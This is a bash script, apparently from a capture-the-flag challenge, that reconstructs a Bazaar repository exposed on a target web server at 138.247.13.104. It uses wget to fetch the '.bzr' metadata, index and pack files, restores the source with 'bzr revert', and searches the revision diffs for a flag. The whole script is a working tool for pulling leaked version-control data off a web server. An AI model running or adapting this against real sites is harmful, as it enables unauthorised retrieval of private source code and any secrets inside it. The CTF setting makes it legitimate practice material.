#!/bin/bash

echo "[*] Creating local repository."
mkdir ctf-bzr
cd ctf-bzr/
bzr init
echo 'foo' > foo.txt
bzr add
bzr commit -m "foo"
rm foo.txt

echo "[*] Replacing last-revision file."
cd .bzr/branch
rm last-revision
wget http://138.247.13.104/.bzr/branch/last-revision

echo "[*] Replacing dirstate file."
cd ../checkout
rm dirstate
wget http://138.247.13.104/.bzr/checkout/dirstate

echo "[*] Replacing pack-names file."
cd ../repository
rm pack-names
wget http://138.247.13.104/.bzr/repository/pack-names


echo "[*] Using check command to discover missing files."
cd indices/
rm *.cix
rm *.iix
rm *.rix
rm *.six
rm *.tix
cd ../packs
rm *.pack
cd ../../../
while true; do
   CHECK_OUTPUT=$(bzr check 2>&1)
   if [[ $CHECK_OUTPUT == *"bzr: ERROR: No such file:"* ]]; then
      MISSING_FILE=$(echo $CHECK_OUTPUT | sed 's/.*\([0-9a-f]\{32\}\).*/\1/')
      echo "[*] Missing files $MISSING_FILE."
      declare -a EXTENSIONS=("cix" "iix" "rix" "six" "tix")
      for EXTENSION in "${EXTENSIONS[@]}"; do
         TARGET_URL="http://138.247.13.104/.bzr/repository/indices/$MISSING_FILE.$EXTENSION"
         echo "[*] Downloading $TARGET_URL"
         wget $TARGET_URL -P .bzr/repository/indices/
      done
      TARGET_URL="http://138.247.13.104/.bzr/repository/packs/$MISSING_FILE.pack"
      echo "[*] Downloading $TARGET_URL"
      wget $TARGET_URL -P .bzr/repository/packs/
   else
      echo "[*] Probably all missing files have been downloaded."
      break
   fi
done

echo "[*] Reverting missing source files."
bzr revert

echo "[*] Searching the flag into revisions."
R=1
while true; do
   RNEXT=$((R+1))
   
   # Analyzing diff.
   REVISION=$(bzr diff -r$R..$RNEXT)
   if [[ $REVISION == "" ]]; then
      break
   elif [[ $REVISION != *"noIdeaWhatImDoing"* ]]; then
      echo "[*] ... $R -> $RNEXT"
      echo $REVISION
   fi

   R=$RNEXT
done